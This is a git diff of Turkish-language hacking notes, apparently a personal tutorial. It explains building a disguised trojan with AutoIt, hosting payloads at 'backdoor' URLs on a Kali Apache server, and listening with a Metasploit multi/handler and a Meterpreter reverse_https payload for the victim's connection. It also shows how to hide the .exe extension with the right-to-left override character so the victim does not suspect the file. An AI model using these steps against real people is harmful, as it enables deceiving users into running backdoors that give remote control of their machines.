@@ -136,4 +136,25 @@ EndFunc ;==>\_GetURLImage
 - bu kodu .txt yap
 - kaliyi apachi komutu ile servis yap
 - Üstteki url kısımlarına "http://192.168.64.8/backdoor/android.jpg" "http://192.168.64.8/backdoor/myhttps.exe"
-  -Autoit Compile Script to .exe aç ve .txt dosyasını icon u gir
+- Autoit Compile Script to .exe aç ve .txt dosyasını icon u gir
+
+\*\* kurban dosyayı indirip çalıştırdığında kaliden dinlenir
+
+> msfconsole
+> use exploit>multi>handler
+> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+> msf6 exploit(multi/handler) > show options
+> msf6 exploit(multi/handler) > set LHOST 192.168.64.8
+> msf6 exploit(multi/handler) > set LPORT 4545
+> msf6 exploit(multi/handler) > exploit -j -z
+> msf6 exploit(multi/handler) > exploit -l
+> msf6 exploit(multi/handler) > exploit -1
+> meterpreter>
+
+**_ Uzantıları Değiştirmiş Göstermek _**
+
+- .exe dosyası indirdiğinde kurban bunun tuzak olduğunu anlamamasını sağlamak için uzantı değiştirirlir.
+
+- Tarayıcıdan "right to left chacter override" herhangi site veya unicode explorer fir. copy yap
+
+-oluşan .exe doyasını isim değiştirme açılır. Sonuna yapıştır. İsim değiştir
